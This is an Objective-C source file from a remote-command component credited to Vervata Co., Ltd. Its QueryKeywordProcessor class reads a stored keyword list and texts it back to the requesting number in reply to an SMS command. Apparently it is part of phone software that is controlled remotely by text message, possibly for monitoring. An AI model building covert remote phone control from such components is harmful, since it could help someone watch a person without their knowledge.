
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryKeywordProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryKeywordProcessor.h"
#import "PrefKeyword.h"
#import "Preference.h"

@interface QueryKeywordProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryKeywords;
@end

@implementation QueryKeywordProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryKeywordProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (QueryKeywordProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryKeywordProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryKeywordProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"QueryKeywordProcessor--->doProcessingCommand")
    [self processQueryKeywords];
}

#pragma mark QueryKeywordProcessor  PrivateAPI

/**
 - Method name: processQueryKeywords
 - Purpose:This method is used to process query keywords
 - Argument list and description: No Return Type
 - Return description: No Argument.
*/

- (void) processQueryKeywords {
	DLog (@"QueryKeywordProcessor--->processQueryKeywords")
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefKeyword *prefKeyword = (PrefKeyword *) [prefManager preference:kKeyword];
	NSArray *keywordList=[prefKeyword mKeywords];
	NSString *result=NSLocalizedString(@"kQueryKeywords", @"");
	for (NSString *keyword in keywordList) {
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:keyword];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMSWithResult
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult (NSString)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"QueryKeywordProcessor--->sendReplySMSWithResult")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *queryKeywordMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryKeywordMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryKeywordMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
